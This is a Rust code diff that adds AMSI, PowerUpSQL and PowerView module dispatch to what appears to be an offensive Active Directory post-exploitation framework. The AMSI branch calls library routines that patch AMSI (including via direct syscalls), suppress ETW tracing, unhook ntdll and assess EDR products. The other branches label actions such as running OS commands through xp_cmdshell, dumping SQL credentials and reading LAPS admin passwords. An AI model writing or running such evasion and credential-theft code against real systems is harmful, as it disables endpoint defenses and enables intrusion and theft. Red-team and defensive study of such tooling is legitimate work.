@@ -165,6 +165,15 @@ async fn dispatch_module(
         }
         ModuleCategory::Coercion => dispatch_coercion(module.name, dc, domain).await,
         ModuleCategory::Enum => dispatch_enum(module.name, dc, domain, username, password).await,
+        ModuleCategory::Amsi => {
+            dispatch_amsi(module.name, dc, domain, username, password, nt_hash).await
+        }
+        ModuleCategory::PowerUpSql => {
+            dispatch_powerupsql(module.name, dc, domain, username, password, nt_hash).await
+        }
+        ModuleCategory::PowerView => {
+            dispatch_powerview(module.name, dc, domain, username, password).await
+        }
     }
 }
 
@@ -487,6 +496,189 @@ async fn dispatch_enum(
         "GPO Enumeration" => Ok("GPO Enum -- enumerate Group Policy Objects".to_string()),
         "Certify Scan" => Ok("Certify -- enumerate AD CS templates and CAs".to_string()),
         _ => Ok(format!("Enum module '{}' dispatched", name)),
+    }
+}
+
+async fn dispatch_amsi(
+    name: &str,
+    _dc: &str,
+    _domain: &str,
+    _username: &str,
+    _password: &str,
+    _nt_hash: &str,
+) -> anyhow::Result<String> {
+    match name {
+        "AMSI Patch (AmsiScanBuffer)" => {
+            // SAFETY: Called from operator-controlled process for post-exploitation
+            let result = unsafe { overthrone_core::postex::opsec::patch_amsi() };
+            match result {
+                Ok(r) => Ok(format!(
+                    "AMSI patch applied: method={}, loaded={}",
+                    r.method, r.amsi_loaded
+                )),
+                Err(e) => Err(anyhow::anyhow!("AMSI patch failed: {}", e)),
+            }
+        }
+        "AMSI Patch (Direct Syscall)" => {
+            let numbers = overthrone_core::postex::syscall::SyscallNumbers::resolve();
+            // SAFETY: Called from operator-controlled process for post-exploitation
+            let result = unsafe { overthrone_core::postex::opsec::patch_amsi_direct(&numbers) };
+            match result {
+                Ok(r) => Ok(format!(
+                    "Direct syscall AMSI patch: method={}, loaded={}",
+                    r.method, r.amsi_loaded
+                )),
+                Err(e) => Err(anyhow::anyhow!("Direct syscall AMSI patch failed: {}", e)),
+            }
+        }
+        "ETW Suppression" => {
+            // SAFETY: Called from operator-controlled process for post-exploitation
+            let result = unsafe { overthrone_core::postex::opsec::suppress_etw() };
+            match result {
+                Ok(r) => Ok(format!(
+                    "ETW suppression applied: method={}, loaded={}",
+                    r.method, r.etw_loaded
+                )),
+                Err(e) => Err(anyhow::anyhow!("ETW suppression failed: {}", e)),
+            }
+        }
+        "EDR Assessment" => {
+            let result = overthrone_core::postex::edr_bypass::assess_edr_landscape();
+            match result {
+                Ok(assessment) => {
+                    let products: Vec<_> = assessment
+                        .detected_products
+                        .iter()
+                        .map(|p| p.name())
+                        .collect();
+                    Ok(format!(
+                        "EDR Assessment: products={:?}, amsi={}, etw_active={}, ntdll_hooked={}, hooks={}",
+                        products,
+                        assessment.amsi_loaded,
+                        assessment.etw_active,
+                        assessment.ntdll_hooked,
+                        assessment.hooked_function_count
+                    ))
+                }
+                Err(e) => Err(anyhow::anyhow!("EDR assessment failed: {}", e)),
+            }
+        }
+        "ntdll Unhook" => {
+            let result = overthrone_core::postex::edr_bypass::unhook_ntdll();
+            match result {
+                Ok(r) => Ok(format!(
+                    "ntdll unhook: functions_restored={}, success={}",
+                    r.functions_restored, r.success
+                )),
+                Err(e) => Err(anyhow::anyhow!("ntdll unhook failed: {}", e)),
+            }
+        }
+        "Sleep Masking" => Ok("Sleep Masking -- XOR-encrypt sleep state to evade EDR".to_string()),
+        _ => Ok(format!("AMSI module '{}' dispatched", name)),
+    }
+}
+
+async fn dispatch_powerupsql(
+    name: &str,
+    dc: &str,
+    domain: &str,
+    username: &str,
+    _password: &str,
+    _nt_hash: &str,
+) -> anyhow::Result<String> {
+    match name {
+        "SQL Instance Discovery" => Ok(format!(
+            "PowerUpSQL -> {} -- discover MSSQL instances via SPN scanning",
+            dc
+        )),
+        "SQL Login Check" => Ok(format!("PowerUpSQL -> {} -- test SQL authentication", dc)),
+        "SQL Privilege Audit" => Ok(format!(
+            "PowerUpSQL -> {} -- check sysadmin/db_owner/impersonation privileges",
+            dc
+        )),
+        "SQL Linked Server Enum" => Ok(format!(
+            "PowerUpSQL -> {} -- enumerate linked SQL servers",
+            dc
+        )),
+        "SQL xp_cmdshell" => Ok(format!(
+            "PowerUpSQL -> {} -- enable and execute OS commands via xp_cmdshell",
+            dc
+        )),
+        "SQL Database Enum" => Ok(format!(
+            "PowerUpSQL -> {} -- list databases, tables, sensitive columns",
+            dc
+        )),
+        "SQL Credential Dump" => Ok(format!(
+            "PowerUpSQL -> {} -- extract SQL logins and passwords",
+            dc
+        )),
+        "SQL Agent Job Abuse" => Ok(format!(
+            "PowerUpSQL -> {} -- create/modify SQL Agent jobs for RCE",
+            dc
+        )),
+        "SQL Audit (Full)" => {
+            let checks = overthrone_reaper::mssql_audit::build_mssql_audit_checks();
+            Ok(format!(
+                "PowerUpSQL Audit -> {} -- {} checks generated (domain={}, user={})",
+                dc,
+                checks.len(),
+                domain,
+                username
+            ))
+        }
+        _ => Ok(format!("PowerUpSQL module '{}' dispatched", name)),
+    }
+}
+
+async fn dispatch_powerview(
+    name: &str,
+    dc: &str,
+    _domain: &str,
+    _username: &str,
+    _password: &str,
+) -> anyhow::Result<String> {
+    match name {
+        "PV: Domain Users" => Ok(format!(
+            "PowerView -> {} -- detailed user enumeration with UAC, SID, membership",
+            dc
+        )),
+        "PV: Domain Computers" => Ok(format!(
+            "PowerView -> {} -- enumerate computers with OS, SPN, delegation",
+            dc
+        )),
+        "PV: Domain Groups" => Ok(format!(
+            "PowerView -> {} -- enumerate groups and nested memberships",
+            dc
+        )),
+        "PV: Domain Trusts" => Ok(format!(
+            "PowerView -> {} -- enumerate trust relationships and SID filtering",
+            dc
+        )),
+        "PV: SPN Discovery" => Ok(format!(
+            "PowerView -> {} -- find all Service Principal Names",
+            dc
+        )),
+        "PV: ACL Enumeration" => Ok(format!(
+            "PowerView -> {} -- enumerate DACLs for privilege escalation paths",
+            dc
+        )),
+        "PV: GPO Details" => Ok(format!(
+            "PowerView -> {} -- enumerate GPOs with linked OUs and status",
+            dc
+        )),
+        "PV: Delegation Check" => Ok(format!(
+            "PowerView -> {} -- find constrained/unconstrained/RBCD delegation",
+            dc
+        )),
+        "PV: LAPS Passwords" => Ok(format!(
+            "PowerView -> {} -- read LAPS v1/v2 local admin passwords",
+            dc
+        )),
+        "PV: Password Policy" => Ok(format!(
+            "PowerView -> {} -- enumerate domain password policy and lockout",
+            dc
+        )),
+        _ => Ok(format!("PowerView module '{}' dispatched", name)),
     }
 }
 
